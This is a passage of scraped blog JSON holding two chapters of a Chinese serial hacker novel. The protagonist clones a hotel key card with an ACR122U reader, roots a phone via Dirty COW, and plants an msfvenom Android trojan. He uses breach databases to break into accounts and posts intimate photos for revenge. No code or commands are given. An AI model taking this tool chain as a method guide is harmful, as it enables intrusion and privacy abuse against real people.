有一个小音箱播放着音乐。在看最前面的那个人，大概60岁左右的样子，穿了一身黑色武术服，深深的眉毛，眼睛随着他的手移动着，他的动作圆活，连绵不绝，步伐轻盈如行云流水。王梓被这个老大爷吸引住了，觉得很帅气，便多看了会，心中感叹，原来太极拳是这样的优美。过了10多分钟结束了。老大爷走到旁边的凳子旁，从包里拿出一条毛巾来擦头上的汗。&lt;/p&gt;\n&lt;p&gt;“大爷，您打的拳简直太漂亮了。”王梓走上前去赞美起大爷。&lt;/p&gt;\n&lt;p&gt;“怎么，小伙子，你感兴趣？”大爷反问道。&lt;/p&gt;\n&lt;p&gt;“我是看您打，真的很美。吸引了我。” 王梓回复道。&lt;/p&gt;\n&lt;p&gt;“太极拳需要常年联系，对人身体有很大的益处，别人动作轻柔缓慢，但是，把每一个动作做到优雅，灵活，必须要要用力。你看我这么大年纪，身体一直很好，比起你们一些年轻人都要好呢。就说你们现在这些年轻人整天就知道对着电脑和手机，又爱熬夜，身体还不如我这个老头子呢。”&lt;/p&gt;\n&lt;!-- more --&gt;\n&lt;p&gt;王梓微微一笑。&lt;/p&gt;\n&lt;p&gt;“大爷接着便问道，小伙子你要学不？年轻人学习很快的，对身体也有好处。”&lt;/p&gt;\n&lt;p&gt;“我能跟您学么？我倒是有兴趣学习。”&lt;/p&gt;\n&lt;p&gt;“当然可以，我很乐意教你这样的年轻人。”&lt;/p&gt;\n&lt;p&gt;“那太好了，那我每天就过来跟着你们一起练习吧。”&lt;/p&gt;\n&lt;p&gt;“今天我先给你大概介绍下太极拳。自然界一切事物的运动，无一不是阴阳的对立统一。人的生命运动，其本身就是阴阳对立双方，在不断的矛盾运动中取得统一的过程。而太极拳就顺从阴阳变化之理，在一招一势动作之中，阴中含阳，阳中具阴，阴阳互变，相辅而生。”&lt;/p&gt;\n&lt;p&gt;王梓听到这里，他默默的把这段话记在了心里，阴阳的对立统一，这个跟他每天接触的计算机中0与1，黑客攻与防有着同样的原理。计算机世界由0和1组成，就是因为有了0和1，经过了几十年的发展演变出了如今纷繁复杂的互联网世界。而黑客的攻防不也是在对立与统一中不断的发生着变化。但是他们万变不离其宗，最终都归为阴与阳，或0和1。&lt;/p&gt;\n&lt;p&gt;“太极拳属于内家拳，通过不断的练习使练习者的意、气、形、神融于一体的至高境界的拳法，与道家的思想是一致的。我练习的是陈氏太极拳，要教给你的是74式老架一路。“老大爷接着讲道。&lt;/p&gt;\n&lt;p&gt;”我了解了。那我明天几点过来开始学习呢？“&lt;/p&gt;\n&lt;p&gt;”明天七点。“&lt;/p&gt;\n&lt;p&gt;”好，那我明天就过来。今天我就要先回去了。“&lt;/p&gt;\n&lt;p&gt;回到家中，王梓的电脑右下角弹出一封新邮件提醒，是一封pgp加密的邮件（见注解1）。他知道，来新的生意了。他先根据发送过来的邮件头确认了下对方使用的ip地址，确认对方使用的是tor ip地址后，他在自己的聊天服务器中添加了一个临时账号，将对方发送过来的pgp key加密后，回复给了对方。&lt;/p&gt;\n&lt;p&gt;没过多久，王梓的聊天软件就有一个头像开始闪动起来。打开来看，正式刚才发送邮件的那个人。&lt;/p&gt;\n&lt;p&gt;“您好，47先生，我这里有一个单子，不知道您能不能接。”对方发送过来的消息。&lt;/p&gt;\n&lt;p&gt;“出来做生意的，有钱赚就可以接。”&lt;/p&gt;\n&lt;p&gt;“我这一单出价500万。”&lt;/p&gt;\n&lt;p&gt;王梓看到这个价格后，就在想究竟是什么样单子可以开到这样的价格呢？&lt;/p&gt;\n&lt;p&gt;“你想要我帮你拿到什么？”&lt;/p&gt;\n&lt;p&gt;“我要你帮我窃取一份计划书。拿到他们的成员名单。”&lt;/p&gt;\n&lt;p&gt;”目标是谁？“&lt;/p&gt;\n&lt;p&gt;”目标与HH集团有关，与他们的ceo相关，他们ceo手里会有成员名单，在根据成员名单找到存放计划书的人。“&lt;/p&gt;\n&lt;p&gt;“目标期限是？”&lt;/p&gt;\n&lt;p&gt;“3个月，我会向你的比特币账户先转25个给你，剩下的当你有进展了会分阶段给你。”&lt;/p&gt;\n&lt;p&gt;“等我的消息。”&lt;/p&gt;\n&lt;p&gt;王梓坐在椅子上，心中充满了疑惑，因为从未有过如此高额佣金的人找过他。究竟是什么样的计划书和名单竟然值这么多钱？他有些迫不及待的想要知道答案。正所谓知己知彼，百战不殆。王梓需要制定新一轮的计划，并需要对对手坐一个全面的了解。&lt;/p&gt;\n&lt;p&gt;HH集团一家全国范围内的大型企业，总部设在北京。面对这样一个庞大的企业，渗透进入核心是相当的不容易。&lt;/p&gt;\n&lt;p&gt;好久没工作了，是该试试刚刚打造不久的新武器了。王梓已经开始行动起来了。&lt;/p&gt;\n&lt;p&gt;奇护公司午休时分&lt;/p&gt;\n&lt;p&gt;小白聚精会神的坐在电脑面前，他不紧不慢的操作操作者电脑桌面上的软件，软件的标题显示着burpstuite的字样。此刻的小白正在挖掘一家知名互联网公司——企鹅科技的漏洞。小白平时除了上班，在闲暇的时候都会通过挖掘各大企业的漏洞并提交给这些企业的安全运营团队，这个公司就会给提交漏洞的人相应的金钱奖励。这种模式在国内喝国外都已经非常流行，并且还有专门的相应第三方平台，国内的有补天漏洞响应平台，国外有hackerone的平台。这个赚外快的好处是合法的，并且拿到的奖励是税后的，技术水平好的，一个月可以赚的很丰厚。经过小白的刚刚的操作测试，他发现存在安全问题。接下来，他截了几张图，打开了企鹅科技提交漏洞的页面，把截图上传，并编辑了几行文字便提交上去了。接下来他就是等待着平台审核通过他的漏洞并给出相对应的奖励。小白心里想着，又可以出去吃一顿好吃的了，脸上则自然的流露出一丝笑容。&lt;/p&gt;\n&lt;p&gt;（未完待续）&lt;/p&gt;\n&lt;h2 id=\&#34;注解\&#34;&gt;注解&lt;/h2&gt;\n&lt;p&gt;1、PGP(Pretty Good Privacy)，是一个基于RSA公钥加密体系的邮件加密软件。可以用它对邮件保密以防止非授权者阅读，它还能对邮件加上数字签名从而使收信人可以确认邮件的发送者，并能确信邮件没有被篡改。它可以提供一种安全的通讯方式，而事先并不需要任何保密的渠道用来传递密匙。它采用了一种RSA和传统加密的杂合算法，用于数字签名的邮件文摘算法，加密前压缩等，还有一个良好的人机工程设计。它的功能强大，有很快的速度。而且它的源代码是免费的。&lt;/p&gt;\n&#34;,&#34;fileName&#34;:&#34;Killer-Chapter-Six&#34;,&#34;abstract&#34;:&#34;&lt;p&gt;&lt;strong&gt;自然界一切事物的运动，无一不是阴阳的对立统一。人的生命运动，其本身就是阴阳对立双方，在不断的矛盾运动中取得统一的过程。&lt;/strong&gt;&lt;/p&gt;\n&lt;figure data-type=\&#34;image\&#34; tabindex=\&#34;1\&#34;&gt;&lt;img src=\&#34;https://bacde.me/post-images/1584521521472.jpg\&#34; alt=\&#34;\&#34; loading=\&#34;lazy\&#34;&gt;&lt;/figure&gt;\n&lt;p&gt;夜深了，天气有些阴沉，有些发闷，让人感觉呼吸困难。路上还有几个刚刚下班的人往家里走，他们看上去有些疲惫，不时有几辆车呼啸而过。没过多久，狂风大作，电闪雷鸣，路边的树枝开始疯狂的摇头。很快无情的雨点从天空中落下，打在了正在赶路人的身上，人们纷纷拿着自己的包顶在头顶奔跑起来。这突如其来的一场大雨，拦住了深夜要赶回家的人，也惊醒了许多刚刚入睡的人们，还有那些害怕打雷无法入睡的人们。&lt;/p&gt;\n&lt;p&gt;风雨总是短暂的，下了一整夜的雨，清晨的空气变得清新起来，王梓伸了一个懒腰，然后拉开了窗帘，外面的阳光飞速的跑进屋内，填满整个卧室。打开窗，一股清爽的空气扑面而来，瞬间让人神清气爽。风雨过后总是会迎来美好，又或者给人们带来些许惊喜，比如雨后彩虹。&lt;/p&gt;\n&lt;p&gt;在这样一个美好的早晨，给人的心情也自然是不一样的，王梓准备下楼去公园转转。宅了许久，也应该出去呼吸一下外面的新鲜空气了。简单洗漱下，换了件宽松的衣服王梓救下楼了。&lt;/p&gt;\n&lt;p&gt;公园内都是些年纪较大的人，有的在空地上打羽毛球，有的老大爷站在树旁，不断用自己侧面的身体撞向树，然后弹回来，在撞过去，一会在用后背重复刚才的动作。有的老大妈则站在树下练习着嗓子。王梓心里想着当自己老了的时候是否也是差不多的样子，想想，自己摇摇头笑了。继续向前走，不远处可以看到有一群老年人，他们动作轻柔又缓慢，有的还穿着武术服，旁边有一个小音箱播放着音乐。在看最前面的那个人，大概60岁左右的样子，穿了一身黑色武术服，深深的眉毛，眼睛随着他的手移动着，他的动作圆活，连绵不绝，步伐轻盈如行云流水。王梓被这个老大爷吸引住了，觉得很帅气，便多看了会，心中感叹，原来太极拳是这样的优美。过了10多分钟结束了。老大爷走到旁边的凳子旁，从包里拿出一条毛巾来擦头上的汗。&lt;/p&gt;\n&lt;p&gt;“大爷，您打的拳简直太漂亮了。”王梓走上前去赞美起大爷。&lt;/p&gt;\n&lt;p&gt;“怎么，小伙子，你感兴趣？”大爷反问道。&lt;/p&gt;\n&lt;p&gt;“我是看您打，真的很美。吸引了我。” 王梓回复道。&lt;/p&gt;\n&lt;p&gt;“太极拳需要常年联系，对人身体有很大的益处，别人动作轻柔缓慢，但是，把每一个动作做到优雅，灵活，必须要要用力。你看我这么大年纪，身体一直很好，比起你们一些年轻人都要好呢。就说你们现在这些年轻人整天就知道对着电脑和手机，又爱熬夜，身体还不如我这个老头子呢。”&lt;/p&gt;\n&#34;,&#34;title&#34;:&#34;原创小说《杀手》第六章 阴与阳 0与1 攻与防&#34;,&#34;tags&#34;:[{&#34;name&#34;:&#34;小说&#34;,&#34;slug&#34;:&#34;CxFvcMcMqY5&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;https://bacde.me/tag/CxFvcMcMqY5/&#34;},{&#34;name&#34;:&#34;novel&#34;,&#34;slug&#34;:&#34;JJyH5v-0vnk&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;https://bacde.me/tag/JJyH5v-0vnk/&#34;},{&#34;name&#34;:&#34;PGP&#34;,&#34;slug&#34;:&#34;9t0OE-6H4iZ&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;https://bacde.me/tag/9t0OE-6H4iZ/&#34;},{&#34;name&#34;:&#34;太极&#34;,&#34;slug&#34;:&#34;MurdxbfUC5x&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;https://bacde.me/tag/MurdxbfUC5x/&#34;}],&#34;date&#34;:&#34;2020-03-18 16:51:21&#34;,&#34;dateFormat&#34;:&#34;2020-03-18&#34;,&#34;feature&#34;:&#34;&#34;,&#34;link&#34;:&#34;https://bacde.me/post/Killer-Chapter-Six/&#34;,&#34;hideInList&#34;:false,&#34;isTop&#34;:false,&#34;stats&#34;:{&#34;text&#34;:&#34;9 min read&#34;,&#34;time&#34;:485000,&#34;words&#34;:2398,&#34;minutes&#34;:9},&#34;description&#34;:&#34;自然界一切事物的运动，无一不是阴阳的对立统一。人的生命运动，其本身就是阴阳对立双方，在不断的矛盾运动中取得统一的过程。\n\n夜深了，天气有些阴沉，有些发闷，让人感觉呼吸困难。路上还有几个刚刚下班的人往家里走，他们看上去有些疲惫，不时有几辆车呼...&#34;,&#34;toc&#34;:&#34;&lt;ul class=\&#34;markdownIt-TOC\&#34;&gt;\n&lt;li&gt;\n&lt;ul&gt;\n&lt;li&gt;&lt;a href=\&#34;#%E6%B3%A8%E8%A7%A3\&#34;&gt;注解&lt;/a&gt;&lt;/li&gt;\n&lt;/ul&gt;\n&lt;/li&gt;\n&lt;/ul&gt;\n&#34;},{&#34;content&#34;:&#34;&lt;p&gt;&lt;strong&gt;黑客，月光下的魔术师。一个看似固若金汤，并投入了巨大的财力、人力、物力打造网络安全防护系统。每天有专人盯着，并可以随时触碰到。就是这样的系统，黑客往往也只会微微一笑，以你意想不到的方式去侵入你的系统。他们喜欢黑夜，他们在黑暗中默默的监视着你的一举一动。而你对此一无所知。&lt;/strong&gt;&lt;/p&gt;\n&lt;figure data-type=\&#34;image\&#34; tabindex=\&#34;1\&#34;&gt;&lt;img src=\&#34;https://bacde.me/post-images/1584422783667.jpeg\&#34; alt=\&#34;\&#34; loading=\&#34;lazy\&#34;&gt;&lt;/figure&gt;\n&lt;h2 id=\&#34;解雇\&#34;&gt;解雇&lt;/h2&gt;\n&lt;p&gt;王梓在写着代码，旁边的两个同事在讨论。&lt;/p&gt;\n&lt;p&gt;同事小王先开口说道：“听说最近公司要裁员，咱们哥几个可得好好表现下，别被裁了，特殊时期可别往枪口上撞啊。”&lt;/p&gt;\n&lt;p&gt;“你这消息真的假的啊？”同事小张半信半疑地问道。&lt;/p&gt;\n&lt;p&gt;“这还能有假，其他几个部门已经有人被开除了。”&lt;/p&gt;\n&lt;p&gt;“那你是从哪里得到的消息啊？”&lt;/p&gt;\n&lt;p&gt;“另外一个部门的同事跟我说的，消息绝对可靠。没准啊，下一个就该我们部门喽～”&lt;/p&gt;\n&lt;p&gt;此时王梓部门的领导走了过来，旁边的两个人赶紧装作忙工作的样子。&lt;/p&gt;\n&lt;p&gt;“王梓，你到我办公室来一趟。”&lt;/p&gt;\n&lt;p&gt;王梓起身，朝领导办公室走去。旁边的两个同事面面相觑。小张先说话了：“你这乌鸦嘴，还真是，看来他这次要被开喽，他写的代码经常有bug（注解1：），有几次还是我给他调好的呢。平时就不爱说话，也不跟人交流，难怪技术那么差。”&lt;/p&gt;\n&lt;p&gt;“是啊，我也给他改过几次呢。咱们先准备准备，领导如果找咱们了，咱们跟领导求求情。”&lt;/p&gt;\n&lt;p&gt;“嗯，好。”&lt;/p&gt;\n&lt;p&gt;王梓来到领导办公室。&lt;/p&gt;\n&lt;!-- more --&gt;\n&lt;p&gt;“王梓啊，你来公司多久了？”领导很客气地问了一句。&lt;/p&gt;\n&lt;p&gt;“已经两年了。”&lt;/p&gt;\n&lt;p&gt;“时间过的真快啊，都两年了。你看你来公司这么久了，也给公司出了不少力。辛苦了。”&lt;/p&gt;\n&lt;p&gt;“没有啦。”王梓挠挠头，有点不好意思。其实，他并不是不知道领导说的意思，只是装作不知道。&lt;/p&gt;\n&lt;p&gt;“唉！但是最近公司不景气，业务也开始下滑了。你也了解现在的行内情况……”&lt;/p&gt;\n&lt;p&gt;“领导，我辞职。”没等领导说完，王梓便提前开了口。&lt;/p&gt;\n&lt;p&gt;领导这样一听，内心有些诧异，心想：“这小子什么时候脑子开窍了。”随即又说道：“你一直干的不错，虽然我总骂你，你也知道，我都是为了你好。我也是实在没办法。”&lt;/p&gt;\n&lt;p&gt;此时的王梓没有说话，起身就往外走，快走到门口时，领导说：“兄弟，今晚我请你吃饭。”&lt;/p&gt;\n&lt;p&gt;王梓头也没回地说：“不用了。”而他这一次也没有害羞，开门走了出去。王梓心里想“老子早他妈不想干了”，一直以来在这里只是为了掩饰身份，他被开除了就名正言顺了。他早就看不惯这里的人和事了。在这个公司里，唯一对他好的就是翻译小楠。&lt;/p&gt;\n&lt;p&gt;办公室里只剩领导一人，他心想：“这小子不会是傻了吧。”&lt;/p&gt;\n&lt;p&gt;王梓来到小楠面前，小声地说：“我被开除了。”&lt;/p&gt;\n&lt;p&gt;小楠停下手中的工作，有点惊讶。&lt;/p&gt;\n&lt;p&gt;“为什么啊？不行，我去跟领导说说。”小楠起身要去找领导，不过被王梓用双手按在工位上。&lt;/p&gt;\n&lt;p&gt;“没事，我正好也换换环境，最近也挺辛苦，好好休息一下。”&lt;/p&gt;\n&lt;p&gt;“你别难过哦。你能这么想，也挺好的。”小楠安慰王梓。&lt;/p&gt;\n&lt;p&gt;“这样吧，我晚上请你吃饭。谢谢你最近这段时间每天给我带早餐，今晚你就跟着我，姐带你吃香的，喝辣的去。”。&lt;/p&gt;\n&lt;p&gt;“好～”王梓傻笑。&lt;/p&gt;\n&lt;h2 id=\&#34;约会\&#34;&gt;约会&lt;/h2&gt;\n&lt;p&gt;炎热的夏季的傍晚，小楠跟王梓走在去餐馆的路上。两个人并排走着，也没有进行什么交谈。小楠今天穿着没有进行太多的打扮，即使这样也如仙子般美丽出众，他们就这样走着，总会有人朝他们两个人看过来。可能小楠已经习惯了这些，不以为然。反倒是王梓有些不好意思。&lt;/p&gt;\n&lt;p&gt;“我们这是准备去吃什么”？王梓开口问。&lt;/p&gt;\n&lt;p&gt;“一会到了，你就知道了”。&lt;/p&gt;\n&lt;p&gt;“哦”。&lt;/p&gt;\n&lt;p&gt;又走了一会。他们在前方左拐，可以看到不远处有几棵参天大树，看上去有很多年头了。树的周围有茂密的草，绿油油的，在草丛中有几朵盛开着的鲜花，格外漂亮。距离草不远处，有一块方形的纯木制牌子，上面写着松本楼几个汉字，下面是英文。在几棵树的后面，有个白色的三层楼，而这个楼就是松本楼这家餐厅。小楠对王梓说：“就是前面这家餐厅了。”&lt;/p&gt;\n&lt;p&gt;“这个餐厅应该有些历史了吧。”&lt;/p&gt;\n&lt;p&gt;“嗯嗯，这个是一家连锁店，有些年头了，我们赶紧进去吧。等进去了，边吃边跟你说说。让你开开眼。”&lt;/p&gt;\n&lt;p&gt;“嗯嗯，好”！王梓笑笑。&lt;/p&gt;\n&lt;p&gt;其实，王梓从内心中还是挺喜欢小楠的，他为此，通过社工库里查到了小楠的163邮箱密码等账户，通过这个邮箱密码，王梓看到了小楠的uber记录，知道了她常去的一些地方。而今天来的这个地方，王梓并没有见小楠以前来过。&lt;/p&gt;\n&lt;p&gt;他们进入店里，服务员们很热情的跟他们打招呼，而小楠也很礼貌的回应，其中一位穿着像是日本武士服的服务员带着他们进入餐厅。经过一扇木格拉门，这里整体颜色是深棕色，材质大多以木质为主，墙壁是由很多相框拼成的，王梓朝后看去，木门上有两个穿着和服女人的画，一个在手里拿着琴，另外一个在跳舞。而这里因为人也不少，还有来回走动的穿着和服的服务员。客人桌上的酒壶等都是日式的。在这里日式的风情浓厚。&lt;/p&gt;\n&lt;p&gt;安排了一个空位坐下。两人开始点菜。&lt;/p&gt;\n&lt;p&gt;“怎么样？很棒吧？”&lt;/p&gt;\n&lt;p&gt;“嗯嗯，从来没来过这样的地方”&lt;/p&gt;\n&lt;p&gt;“我就知道你没来过，特意来带你见识见识的。今天随便点，我请客。”&lt;/p&gt;\n&lt;p&gt;王梓腼腆的笑笑，有些不好意思。&lt;/p&gt;\n&lt;p&gt;两个人点了松竹梅，还有刺身拼盘，拼盘总由海胆赤背三文鱼海螺肉北极贝深海生蚝。当然还有日本烧肉，小楠店了厚切牛舌，牛小排雪花牛肉。&lt;/p&gt;\n&lt;p&gt;小楠指着深海生蚝说，“这个深海生蚝新鲜至极，我在日本做交换生的时候，这个生蚝被我一口吞下。真的是太爽了。&lt;/p&gt;\n&lt;p&gt;王梓只顾着一直点头。而小楠则在一旁不停的跟王梓介绍，还讲了她做交换生的一些事。&lt;/p&gt;\n&lt;p&gt;在这灯光有些朦胧的餐厅里，小楠神采飞扬，丝毫没有停下说话多吃些东西的意思，而另一旁的王梓，完全插不上什么话，只好边吃，边嗯嗯的答应着，不时来一句，好吃～。今晚就在这样的画面中度过了。&lt;/p&gt;\n&lt;p&gt;吃完，王梓送小楠回家，并对小楠道谢。在车上，因为两个人都喝了些酒，但是都没有喝多，小楠笑到，“不用那么客气啦”。&lt;/p&gt;\n&lt;p&gt;王梓的心里很清楚，他这样身份特殊的人是不能有感情的。他的身份不能被别人知道，对于感情，一旦陷入进去，那么给他身边的人带来的必将是痛苦。所以，很多时候，他都只是在装傻，装做什么都不知道。这是王梓的秘密，一个别人都不感兴趣的秘密。&lt;/p&gt;\n&lt;h2 id=\&#34;海南\&#34;&gt;海南&lt;/h2&gt;\n&lt;p&gt;一望无际的蓝色天空，海水在一下一下的拍打着沙滩。王梓穿着一件白色短袖t恤，一条蓝色短裤，戴着一副墨镜，正躺在沙滩上晒着太阳。阳光晒到身上，暖洋洋的。此时的他什么都没想，就静静的听着这海水的声音。这个时候出来旅游的人不多，没有人山人海，也没有那中喧闹。可以拥有自己的时间。离开了喧闹的都市，什么都不用想，全身心的放松，同时呼吸着新鲜的空气，这感觉真的是太棒了。&lt;/p&gt;\n&lt;p&gt;夕阳的余晖洒向大地，路上的行人三俩成群，有情侣，有大人接小孩子放学的，还有与朋友，与闺蜜一起。他们有说有笑，看上去很幸福。放眼望去，似乎只有王梓一个人独自走着。他看着过往的路人，在看向远处的天边，火烧云很美。&lt;/p&gt;\n&lt;p&gt;“妈妈，妈妈，我想要吃冰淇淋，给我买好不好“。旁边不远处的小女孩指着麦当劳的店对她的妈妈说。&lt;/p&gt;\n&lt;p&gt;小女孩的妈妈摸摸她的头，笑笑，然后准别抱起小女孩，就在这时，从这妈妈的身后，有一个看上去20岁左右的小伙子跑了过来，因为跑的速度太快，她撞倒了这位年轻的母亲。&lt;/p&gt;\n&lt;p&gt;”唉，你这个人小伙子，走路注意点哦。“&lt;/p&gt;\n&lt;p&gt;小伙子听到这话，停下脚步，回过头。本以为他会道歉，没想到他却说：”谁叫你挡我的路了。活该。“说完就跑了。不等年轻的母亲说什么。年轻的母亲只好自己站起来，抱起女儿，朝着麦当劳走去。&lt;/p&gt;\n&lt;p&gt;王梓则继续朝酒店走去。&lt;/p&gt;\n&lt;p&gt;来到了酒店的大厅，这时一家四星级的酒店。在酒店的前台，王梓看到了刚才撞人的小伙子。此时这个小伙子正在跟前台的服务员不依不饶，一看就是在闹事。酒店的服务员一直在苦苦的解释着什么，但是小伙子却越来越凶，叫声越来越大。&lt;/p&gt;\n&lt;p&gt;“把你们经理找来！”&lt;/p&gt;\n&lt;p&gt;“先生，请您不要为难我”。&lt;/p&gt;\n&lt;p&gt;服务员耐心的劝说着。但是他依然不依不饶。&lt;/p&gt;\n&lt;p&gt;这个小伙子带了耳坠，染了一头金黄色的头发，穿着一件白色衬衫，脖子上戴了一条金色的项链，黑色休闲裤，一双黑色休闲鞋。看上去很时尚。穿的衣服都是名牌。王梓判断应该是富二代和官二代。对于他的这种行为，王梓是极度讨厌的，不懂得礼貌，一点教养都没有。仗着家里有钱，就到处欺负人。多半是从小父母太惯着了。&lt;/p&gt;\n&lt;p&gt;就在这个时候，一个身材瘦弱的女子，化了很浓的妆，穿的很性感的女子走到了小伙子面前，对他说：”哎，我说你怎么回事，我在电梯那等你半天了，你在这这干什么呢？还上不上去啊。“&lt;/p&gt;\n&lt;p&gt;”我这里有点事，一会儿就上去。你在等等“。&lt;/p&gt;\n&lt;p&gt;”老娘可没功夫等你。你快点。“&lt;/p&gt;\n&lt;p&gt;”好，走，宝贝儿，咱们这就上去。“然后回头对服务员说道：”看我明天在来找你。“&lt;/p&gt;\n&lt;p&gt;”你跟她什么关系啊，还明天找她来。“。&lt;/p&gt;\n&lt;p&gt;”没关系，没关系“。说着就搂着性感的女子的朝客房走去。王梓他们三个人一起走进了电梯。王梓刷了卡，按了电梯，两个人在一起开始甜蜜起来。看来王梓跟她们在同一层。到了，14层，两个人先往电梯外走，王梓实在是对两个人厌恶至极，绝对给他们一个小小的惩罚。&lt;/p&gt;\n&lt;p&gt;在要出电梯的时候，王梓加快了脚步，撞向那个年轻人，同时右手两根手伸向小伙子的裤子后兜里，夹出了年轻人的房卡。&lt;/p&gt;\n&lt;p&gt;”哎哎哎，急着敢死去啊。“&lt;/p&gt;\n&lt;p&gt;”对不起“。王梓本来是不想跟他说什么话的，怕与他纠缠不清，还是说了。&lt;/p&gt;\n&lt;p&gt;”下次注意点。“&lt;/p&gt;\n&lt;p&gt;王梓朝先进了自己的房间，而两个人就在王梓房间附近，小伙子手伸到屁股后面去拿房卡，可是没找到，开始四处翻兜找卡。一旁的妹子急了，遍与他吵起来。&lt;/p&gt;\n&lt;p&gt;王梓回到自己的房间，拿出一个白色的设备（acr122u：nfc安全入门工具，黑客常用来破解mifare1类卡），把房卡放到了设备上，又拿出了一张空白的卡。打开电脑。不到1分钟的功夫，王梓便复制了隔壁人的房卡。&lt;/p&gt;\n&lt;figure data-type=\&#34;image\&#34; tabindex=\&#34;2\&#34;&gt;&lt;img src=\&#34;https://bacde.me/post-images/1584422650768.png\&#34; alt=\&#34;\&#34; loading=\&#34;lazy\&#34;&gt;&lt;/figure&gt;\n&lt;center&gt;acr122u 读写器样子（图片来自网络，如侵删）&lt;/center&gt;\n&lt;p&gt;他走出房间，对着正在争吵的两人说道：”我听说你们的房卡不见了？那个，我刚才在大堂的时候捡到一张卡，你看是不是你们的。“&lt;/p&gt;\n&lt;p&gt;小伙子接过卡，刷了下门，门发出解锁的声音。打开后，两个人看也不看王梓就走进屋，丝毫没有表示感谢的意思。&lt;/p&gt;\n&lt;p&gt;过了一会。王梓准备行动。他走到对面的房门，耳朵贴在门上，听里面的声音，此刻的两个人应该正在洗漱间里边洗澡边玩闹着。王梓刷了卡，小心翼翼的打开门，房间里，两个人的衣服散落在床上，手机房子电视下面的桌子上。有一台三星的，一台iphone7。王梓看了下三星的手机，没有密码。他利用最近新出的dirty cow（脏牛）漏洞提升了最高权限，同时下载并运行了事先准备好的android系统的木马程序（apk木马：此处使用的利用msfvenom生成的android木马。文件后缀为apk。具有远程命令执行的程序）。而在王梓房间中的电脑屏幕上，黑色背景绿色字符的窗口多出了几行字符串。那是木马成功连接到王梓电脑的几行字符串。&lt;/p&gt;\n&lt;figure data-type=\&#34;image\&#34; tabindex=\&#34;3\&#34;&gt;&lt;img src=\&#34;https://bacde.me/post-images/1584422676141.png\&#34; alt=\&#34;\&#34; loading=\&#34;lazy\&#34;&gt;&lt;/figure&gt;\n&lt;center&gt;以上是msfconsole 中对手机摄像头拍照的操作&lt;/center&gt;\n&lt;p&gt;王梓放下手机，赶紧离开了他俩的房间。&lt;/p&gt;\n&lt;p&gt;王梓通过在电脑中，下载了那个人手机的照片，通讯录，同时对手机中的一些令牌信息进行了获取。手机里的照片没有什么，都比较正常。当然，通过手机里获取到的信息。王梓把这个人的邮箱地址和手机号码，放入了社工库中进行搜索。很快的，就差到对方注册的一些网站，以及用户名和密码，地址，身份证号等信息。一切的秘密都显示在了王梓的面前。王梓发现了他的网盘，并登陆了进去。这里的照片，显示了这个小伙子与另外一位姑娘的关系非常亲密，更加让王梓觉得有趣的是还有艳照。&lt;/p&gt;\n&lt;p&gt;恶作剧要开始了，王梓通过获取的信息，很容易的就登陆进了对方的微博，通过他的微博，王梓找到了此时正和他在一起的姑娘的微博和与他发生艳照的姑娘。王梓想着，两个人应该出来了。他发了一条微博，上传了艳照，并@了两个姑娘。&lt;/p&gt;\n&lt;p&gt;没过一会，王梓就听到隔壁两个人吵架的声音，紧接着就听到摔门的声音。从隔壁屋内传来“是谁！是谁！谁干的！啊！！！”。王梓躺在床上得意的笑。&lt;/p&gt;\n&lt;p&gt;（未完待续）&lt;/p&gt;\n&lt;h2 id=\&#34;术语解释\&#34;&gt;术语解释&lt;/h2&gt;\n&lt;ol&gt;\n&lt;li&gt;\n&lt;p&gt;社工库:社工库是一个用户密码等信息的集合。汇总了黑客以及网络泄漏出来的信息积累建立起来的平台或者系统。通过这个平台或者系统可以关联出一个人的用户名，密码，身份，地址等信息。目前网络上有公开的这类系统，也有很多自己搭建并且不公开的系统。&lt;/p&gt;\n&lt;/li&gt;\n&lt;li&gt;\n&lt;p&gt;白色设备：acr122u，生活中常见的饭卡，酒店房卡、门禁卡等的读写工具。价格很便宜。是一款研究nfc安全的入门工具。想要进一步了解的，可以自行搜索相关文章。&lt;/p&gt;\n&lt;/li&gt;\n&lt;li&gt;\n&lt;p&gt;dirty cow：最近一段时间爆出的linux全版本提权漏洞，中文被称为脏牛漏洞，可以进行提升至root权限，linux以及基于linux的系统都可以提升权限。最新的android 7.0系统也受影响。root权限是系统最高权限，黑客可以进行任何的操作。&lt;/p&gt;\n&lt;/li&gt;\n&lt;li&gt;\n&lt;p&gt;android木马：利用msfvenom生成的apk格式的远程控制木马。msfvenom在老版本中名为msfpayload，著名的metasploit framework框架中的工具。利用metasploit framework的程序可以进行管理。&lt;/p&gt;\n&lt;/li&gt;\n&lt;li&gt;\n&lt;p&gt;Bug：Bug,本意为“臭虫”，指现在计算机和程序中隐藏的或者未知的缺陷或者漏洞，这些缺陷或者漏洞会导致系统崩溃，程序运行不正常，错误的结果等；在网络安全领域则是安全缺陷，黑客可以通过它在未授权的情况下入侵系统。当然游戏中也存在Bug，比如打dota的时候看不到英雄了，进入到了不能进入的区域等都属于Bug。&lt;br&gt;\nbug有硬件问题，也有应用系统和软件的问题。软件的Bug，狭义概念是指软件程序的漏洞或缺陷，广义概念（除此之外）还包括测试工程师或用户所发现和提出的软件可改进的细节，或与需求文档存在差异的功能实现等。&lt;br&gt;\n格蕾丝•赫柏（Grace Murray Hopper），是一位为美国海军工作的电脑专家，也是最早将人类语言融入电脑程序的人之一。而代表电脑程序出错的“Bug”这一名字，正是赫柏取的。&lt;br&gt;\n与Bug相对应，人们将发现Bug并加以纠正的过程叫做“Debug”(中文称作“调试”），意即“捉虫子”或“杀虫子”。也是调试的过程。&lt;br&gt;\n后来在很多的软件测试中，人们都用Bug来说明那些问题。&lt;/p&gt;\n&lt;/li&gt;\n&lt;/ol&gt;\n&#34;,&#34;fileName&#34;:&#34;Killer-Chapter-Five&#34;,&#34;abstract&#34;:&#34;&lt;p&gt;&lt;strong&gt;黑客，月光下的魔术师。一个看似固若金汤，并投入了巨大的财力、人力、物力打造网络安全防护系统。每天有专人盯着，并可以随时触碰到。就是这样的系统，黑客往往也只会微微一笑，以你意想不到的方式去侵入你的系统。他们喜欢黑夜，他们在黑暗中默默的监视着你的一举一动。而你对此一无所知。&lt;/strong&gt;&lt;/p&gt;\n&lt;figure data-type=\&#34;image\&#34; tabindex=\&#34;1\&#34;&gt;&lt;img src=\&#34;https://bacde.me/post-images/1584422783667.jpeg\&#34; alt=\&#34;\&#34; loading=\&#34;lazy\&#34;&gt;&lt;/figure&gt;\n&lt;h2 